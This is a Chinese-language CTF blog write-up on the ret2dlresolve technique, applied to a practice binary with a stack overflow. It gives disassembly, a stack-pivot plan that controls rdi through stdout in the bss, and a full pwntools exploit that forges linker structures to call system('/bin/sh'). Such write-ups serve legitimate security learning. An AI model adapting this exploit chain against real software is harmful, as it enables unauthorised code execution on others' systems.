---
title: ret2dlrsolve
published: 2026-03-11
description: "ret2dlrsolve的利用"
tags: ["ctf", "stack", "pwn"]
category: ctf
draft: false
---

## ret2dlrsolve
对于 Linux 程序的调用，一般来说，程序会调用 `dl_runtime_resolve(link_map_obj, reloc_offset)` 函数来对动态连接的函数进行从定位，相比较于ret2libc,
ret2dlresolve,的应用更加灵活，限制更少，但是应用复杂度更高，而且受限于 `RELRO` 即 got.plt. 是否可读可写属性。


## 例题
将程序拖入ida,发现程序只有一次 0x200 的溢出，但是程序中并没有什么有用的函数，同时程序的保护只开了 NX，于是考虑使用 ret2dlresolve 来调用 system 函数。
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  vuln();
  return 0;
}

ssize_t vuln()
{
  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF

  return read(0, buf, 0x200u);
}
```
通过分析发现，程序中不能使用 ROPgadget直接获取控制rdi，的方法，所以我们需要找到其他办法来获取控制rdi的方法，于是通过分析`vuln`函数的汇编我们可以发现
```asm
vuln      ; __unwind {
vuln                      endbr64
vuln+4                    push    rbp
vuln+5                    mov     rbp, rsp
vuln+8                    sub     rsp, 40h
vuln+C                    lea     rax, [rbp+buf]
vuln+10                   mov     edx, 200h       ; nbytes
vuln+15                   mov     rsi, rax        ; buf
vuln+18                   mov     edi, 0          ; fd
vuln+1D                   call    _read
vuln+22                   nop
vuln+23                   leave
vuln+24                   retn
vuln+24   ; } // starts at 401156

main      main            proc near               ; DATA XREF: _start+18↑o
main      ; __unwind {
main                      endbr64
main+4                    push    rbp
main+5                    mov     rbp, rsp
main+8                    mov     rax, cs:stdout
main+F                    mov     ecx, 0          ; n
main+14                   mov     edx, 2          ; modes
main+19                   mov     esi, 0          ; buf
main+1E                   mov     rdi, rax        ; stream
main+21                   call    _setvbuf
main+26                   mov     rax, cs:stdin@GLIBC_2_2_5
main+2D                   mov     ecx, 0          ; n
main+32                   mov     edx, 2          ; modes
main+37                   mov     esi, 0          ; buf
main+3C                   mov     rdi, rax        ; stream
main+3F                   call    _setvbuf
main+44                   mov     eax, 0
main+49                   call    vuln
main+4E                   mov     eax, 0
main+53                   pop     rbp
main+54                   retn
main+54   ; } // starts at 40117B

```
stdout 位于 bss 段可以控制，同时 rax 的地址 最终会赋值到rdi，所以我们可以通过一次栈迁移达到bss段，然后控制stdout的值然后间接控制rax的值，从而控制rdi的值。
让从而实现任意地址的写，之后可以伪造 _dl_runtime 相关的结构体到bss段的较高位然后执行ret2dlresolve。

于是得到如下 exp

```python
from pwn import *

FILE = "./vuln"
context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
libc = elf.libc
rop = ROP(elf)

p = process("./vuln")

readAddr = elf.sym["vuln"] + 0xC
payload = flat(
  {
    0x40: elf.sym["stdout"] + 0x40, # rbp
    0x48: readAddr, # read,
  },
  filler = b"\x00"
)
# raw_input("DEBUG")
p.sendline(payload)

# 构造dlrsolve的结构体
dlresolve = Ret2dlresolvePayload(
  elf = elf,
  symbol = "system",
  args = [], 
  resolution_addr = elf.got["setvbuf"],
  data_addr = 0x404070
)

payload = flat(
  {
    0x0: elf.sym["stdout"] + 0x8, # 由于这个地址指向的是实际的地址，所以需要使用这个地址作为跳板，得到真正的 bin/sh\x00
    0x8: b"/bin/sh\x00",
    0x40: elf.bss() + 0xee0 + 0x40, # read 的时候会减去0x40
    0x48: readAddr, # read,
    0x50: dlresolve.payload
  },  
  filler = b"\x00"
)

raw_input("DEBUG")
p.sendline(payload)
rop.ret2dlresolve(dlresolve)
p.success(rop.dump())

payload = flat(
  {
    0x48: rop.chain(),
    0x58: rop.ret.address,
    0x60: elf.sym["main"]
  },
  filler = b"\x00"
)
raw_input(f"DEBUG: pwndbg -p {p.pid}")
p.sendline(payload)
p.interactive()
```

## 总结
总结： ret2dlrsolve 成功的前提：
需要构造伪造的 .dynamic 结构（ElfSym、ElfRel、字符串等）
使用 pwntool 自动构建
必须是 Partial RELRO或者更宽松的限制，因为需要修改 .got.plt 或使用其结构
